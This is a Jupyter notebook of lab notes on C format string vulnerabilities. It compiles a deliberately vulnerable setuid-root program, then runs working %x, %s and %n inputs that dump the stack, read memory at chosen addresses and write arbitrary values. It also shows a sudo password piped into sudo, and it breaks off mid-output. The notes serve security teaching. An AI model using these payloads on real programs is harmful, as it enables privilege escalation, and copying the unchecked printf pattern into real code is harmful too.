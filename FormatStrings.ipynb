{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format Strings\n",
    "http://www.cplusplus.com/reference/cstdio/printf/?kw=printf\n",
    "\n",
    "- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats\n",
    "- hello.c program uses `printf()` incorrectly!\n",
    "- \"Hello World\\n\" string technically is the format string (devoid of special escape sequences called format parameters)\n",
    "- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments\n",
    "- format specifier follows this prototype:\n",
    "`%[flags][width][.precision][length]specifier`\n",
    "\n",
    "- following parameter requires values as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %d | Decimal |\n",
    "| %u | Unsigned decimal |\n",
    "| %x | Hexadecimal |\n",
    "\n",
    "- the following parameters expect pointers as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %s | String |\n",
    "| %n | Number of bytes written so far |\n",
    "| %p | Memory address |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rw-rw-r-- 1 seed seed 78 Aug  8 18:47 hello.c\r\n"
     ]
    }
   ],
   "source": [
    "# copy hello.c from booksrc folder\n",
    "! cp booksrc/hello.c .\n",
    "! ls -al hello.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "    printf(\"Hello World!\\n\");\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat hello.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile and run hello.c\n",
    "! cp booksrc/compile.sh .\n",
    "! chmod u+x compile.sh\n",
    "! ./compile.sh hello.c hello.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World!\r\n"
     ]
    }
   ],
   "source": [
    "! hello.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Format String Vulnerability\n",
    "- using `printf(string)` instead of `printf(\"%s\", string)`\n",
    "- compile and run fmt_vuln.c from booksrc folder\n",
    "\n",
    "```bash\n",
    "$ ./compile.sh fmt_vuln.c fmt_vuln.exe\n",
    "$ sudo chown root:root ./fmt_vuln.exe\n",
    "$ sudo chmod u+s ./fmt_vuln.exe\n",
    "$ ./fmt_vuln.exe testing\n",
    "$ ./fmt_vuln.exe testing%x\n",
    "$ ./fmt_vuln.exe $(perl -e 'print \"%08x.\"x40')\n",
    "```\n",
    "\n",
    "- print four repeating bytes in reverse order (little-endian architecture)\n",
    "- $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\n",
    "    - these are the arguments for format string stored in higher memory addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "   char text[1024];\r\n",
      "   static int test_val = -72;\r\n",
      "\r\n",
      "   if(argc < 2) {\r\n",
      "      printf(\"Usage: %s <text to print>\\n\", argv[0]);\r\n",
      "      exit(0);\r\n",
      "   }\r\n",
      "   strcpy(text, argv[1]);\r\n",
      "\r\n",
      "   printf(\"The right way to print user-controlled input:\\n\");\r\n",
      "   printf(\"%s\", text);\r\n",
      "\r\n",
      "   printf(\"\\nThe wrong way to print user-controlled input:\\n\");\r\n",
      "   printf(text);\r\n",
      "\r\n",
      "   printf(\"\\n\");\r\n",
      "\r\n",
      "   // Debug output\r\n",
      "   printf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val, test_val);\r\n",
      "\r\n",
      "   exit(0);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cp ./booksrc/fmt_vuln.c .\n",
    "! cat fmt_vuln.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh fmt_vuln.c fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for seed: "
     ]
    }
   ],
   "source": [
    "# dees is password for sudo user\n",
    "! echo dees | sudo -S chown root:root ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxrwxr-x 1 root root 8596 Aug  8 18:54 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "# check ownership of the fmt_vuln.exe\n",
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for seed: "
     ]
    }
   ],
   "source": [
    "! echo dees | sudo -S chmod u+s ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsrwxr-x 1 root root 8596 Aug  8 18:54 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./fmt_vuln.exe <text to print>\r\n"
     ]
    }
   ],
   "source": [
    "# run fmt_vuln.exe\n",
    "! ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing%x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testingbfffe840\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# what if you provide %s as value\n",
    "! ./fmt_vuln.exe testing%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testingtesting%s\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe testing%s\n",
    "# notice testing repeats twice!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "bfffe780.00000000.b7fff858.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# process can be used repeatedly to examine stack memory\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"%08x.\"x40')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "Segmentation fault\r\n"
     ]
    }
   ],
   "source": [
    "! fmt_vuln.exe $(perl -e 'print \"%s.\"x40')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%08x."
     ]
    }
   ],
   "source": [
    "# bunch of 2e78383025 are repeated\n",
    "# each four bytes values are reversed due to little-endian architecture\n",
    "! perl -e 'print \"\\x25\\x30\\x38\\x78\\x2e\"'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reading from Arbitrary Memory Addresses\n",
    "- `%s` format parameter can be used to read from arbitrary memory addresses\n",
    "- part of the original format string can be used to supply an address to the %s format parameter\n",
    "```bash\n",
    "$ ./fmt_vuln.exe AAAA%08x.%08x.%08x.%08x\n",
    "$ ./fmt_vuln.exe AAAA%08x.%08x.%08x.%s # get segfault\n",
    "```\n",
    "- if a valid memory address is used, this process could be used to read a string found at that memory address\n",
    "```bash\n",
    "$ env | grep $PATH\n",
    "```\n",
    "- compile and run booksrc/getenvaddr.c\n",
    "```bash\n",
    "$ ./compile.sh getenvaddr.c getenvaddr\n",
    "$ ./getenvaddr PATH ./fmt_vuln.exe\n",
    "```\n",
    "- use the path address to provide the value for %s\n",
    "```bash\n",
    "$ ./fmt_vuln.exe $(print \"\\x address in reverse bytes\")%08x.%08x.%08x.%s\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA.%08x.%08x.%08x.%08x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA.bfffe830.00000000.b7fff858.41414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe AAAA.%08x.%08x.%08x.%08x\n",
    "# notice that fourth parameter is repeating from begnning of the format string \n",
    "# AAAA to gets its data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "Segmentation fault\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe AAAA%08x.%08x.%08x.%s\n",
    "# why do we get segfault?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH=/usr/local/bin:/home/seed/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:.:/snap/bin:/usr/lib/jvm/java-8-oracle/bin:/usr/lib/jvm/java-8-oracle/db/bin:/usr/lib/jvm/java-8-oracle/jre/bin:/home/seed/android/android-sdk-linux/tools:/home/seed/android/android-sdk-linux/platform-tools:/home/seed/android/android-ndk/android-ndk-r8d:/home/seed/.local/bin\r\n"
     ]
    }
   ],
   "source": [
    "# how about we provide some valid memory address in memory AAAA\n",
    "! env | grep $PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile and run getevnaddr.c to find the memory address of env variables respective to programs\n",
    "! cp ./booksrc/getenvaddr.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tchar *ptr;\r\n",
      "\r\n",
      "\tif(argc < 3) {\r\n",
      "\t\tprintf(\"Usage: %s <environment variable> <target program name>\\n\", argv[0]);\r\n",
      "\t\texit(0);\r\n",
      "\t}\r\n",
      "\tptr = getenv(argv[1]); /* get env var location */\r\n",
      "\tptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */\r\n",
      "\tprintf(\"%s will be at %p\\n\", argv[1], ptr);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat getenvaddr.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh getenvaddr.c getenvaddr.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xbffff3a0\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe PATH ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "����%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "����bfffe830.00000000.b7fff858.sr/local/bin:/home/seed/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:.:/snap/bin:/usr/lib/jvm/java-8-oracle/bin:/usr/lib/jvm/java-8-oracle/db/bin:/usr/lib/jvm/java-8-oracle/jre/bin:/home/seed/android/android-sdk-linux/tools:/home/seed/android/android-sdk-linux/platform-tools:/home/seed/android/android-ndk/android-ndk-r8d:/home/seed/.local/bin\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# lets try to read the value of PATH using fmt_vuln.exe\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\xa0\\xf3\\xff\\xbf\"')%08x.%08x.%08x.%s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "9e"
     ]
    }
   ],
   "source": [
    "! printf \"%x\" $((0xa0-2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "����%08x.%08x.%08x.%s\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "����bfffe830.00000000.b7fff858./usr/local/bin:/home/seed/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:.:/snap/bin:/usr/lib/jvm/java-8-oracle/bin:/usr/lib/jvm/java-8-oracle/db/bin:/usr/lib/jvm/java-8-oracle/jre/bin:/home/seed/android/android-sdk-linux/tools:/home/seed/android/android-sdk-linux/platform-tools:/home/seed/android/android-ndk/android-ndk-r8d:/home/seed/.local/bin\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x9e\\xf3\\xff\\xbf\"')%08x.%08x.%08x.%s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing to Arbitrary Memory Addresses\n",
    "- `%n` format parameter can be used to write to arbitrary memory address\n",
    "- `test_val` variable has been printing its address and value in the debug statement\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%08x.%08x.%08x.%n\n",
    "```\n",
    "- the resulting value in the test variable depends on the number of bytes written before the `%n`\n",
    "- this can be controlled to a a greater degree by manipulating the field width option\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%100x%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")%x%x%400x%n\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "! fmt_vuln.exe testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%08x.%08x.%08x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe830.00000000.b7fff858.\r\n",
      "[*] test_val @ 0x0804a02c = 31 0x0000001f\r\n"
     ]
    }
   ],
   "source": [
    "# test_val is @ 0x0804a02c\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%08x.%08x.%08x.%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe840.0.b7fff858.\r\n",
      "[*] test_val @ 0x0804a02c = 24 0x00000018\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%x.%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%100x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe830.0.                                                                                            b7fff858.\r\n",
      "[*] test_val @ 0x0804a02c = 116 0x00000074\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%100x.%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x.%x.%200x.%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe830.0.                                                                                                                                                                                                b7fff858.\r\n",
      "[*] test_val @ 0x0804a02c = 216 0x000000d8\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x.%x.%200x.%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing User-Controlled Values (0xaddress)\n",
    "- the above trick (manipulating width) works for small numbers but won't work for large ones like memory addresses\n",
    "- let's write 0xDDCCBBAA to variable test_val\n",
    "- 0xAA goes to least significant byte, 0xBB to next byte and so on and 0xDD goes to the most significant byte\n",
    "- 0xAA -> 0x0804a02c\n",
    "- 0xBB -> 0x0804a02d\n",
    "- 0xCC -> 0x0804a02e\n",
    "- 0xDD -> 0x0804a02f\n",
    "```bash\n",
    "\n",
    "$ printf \"%d\\n\" $((0xaa - 28 + 8)) # 150\n",
    "or\n",
    "$ echo $((0xaa - 28 + 8))\n",
    "$ ./fmt_vuln.exe $(printf \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\")%x%x%8x%n #52\n",
    "$ echo $((0xaa-52+8)) #126\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%8x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe8400b7fff858\r\n",
      "[*] test_val @ 0x0804a02c = 21 0x00000015\r\n"
     ]
    }
   ],
   "source": [
    "# findout the width value for 0xaa\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "157\r\n"
     ]
    }
   ],
   "source": [
    "# 0xaa is final value - 21 is what width 8 provides\n",
    "!echo $(( 0xaa - 21 + 8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%157x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe8400                                                                                                                                                     b7fff858\r\n",
      "[*] test_val @ 0x0804a02c = 170 0x000000aa\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 with 157\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%157x%n\n",
    "# text_val = 0x000000aa"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%8x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8200b7fff858\r\n",
      "[*] test_val @ 0x0804a02c = 45 0x0000002d\r\n"
     ]
    }
   ],
   "source": [
    "# next write 0xbb, 0xcc, and 0xdd\n",
    "# need more %x%n format to write to each addresses\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "133\r\n"
     ]
    }
   ],
   "source": [
    "# what is the width so the final value is 0xaa\n",
    "! echo $(( 0xaa-45+8 ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%133x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8200                                                                                                                             b7fff858\r\n",
      "[*] test_val @ 0x0804a02c = 170 0x000000aa\r\n"
     ]
    }
   ],
   "source": [
    "# replace with 8 with 133 to write\n",
    "# force to write 0xaa\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%133x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xbb - 0xaa ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%133x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8200                                                                                                                             b7fff858         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = 48042 0x0000bbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xbb in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%133x%n%17x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xcc - 0xbb ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%133x%n%17x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8100                                                                                                                             b7fff858         4b4e554a         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = 13417386 0x00ccbbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xcc in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%133x%n%17x%n%17x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# finally write 0xdd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xdd - 0xcc ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%133x%n%17x%n%17x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8100                                                                                                                             b7fff858         4b4e554a         4b4e554a         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = -573785174 0xddccbbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xcc in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%133x%n%17x%n%17x%n%17x%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Direct Parameter Access\n",
    "- simplified way to exploit format string vulnerability\n",
    "- allows parameters to be accessed directly by using the dollar sign qualifier\n",
    "    - e.g., `%n$d` would access the nth parameter and display it as a decimal number"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/tmpga_vbkob.c: In function ‘main’:\n",
      "/tmp/tmpga_vbkob.c:3:12: warning: format argument 1 unused before used argument 7 in $-style format [-Wformat=]\n",
      "     printf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\n",
      "            ^\n",
      "/tmp/tmpga_vbkob.c:3:12: warning: format argument 2 unused before used argument 7 in $-style format [-Wformat=]\n",
      "/tmp/tmpga_vbkob.c:3:12: warning: format argument 3 unused before used argument 7 in $-style format [-Wformat=]\n",
      "/tmp/tmpga_vbkob.c:3:12: warning: format argument 5 unused before used argument 7 in $-style format [-Wformat=]\n",
      "/tmp/tmpga_vbkob.c:3:12: warning: format argument 6 unused before used argument 7 in $-style format [-Wformat=]\n",
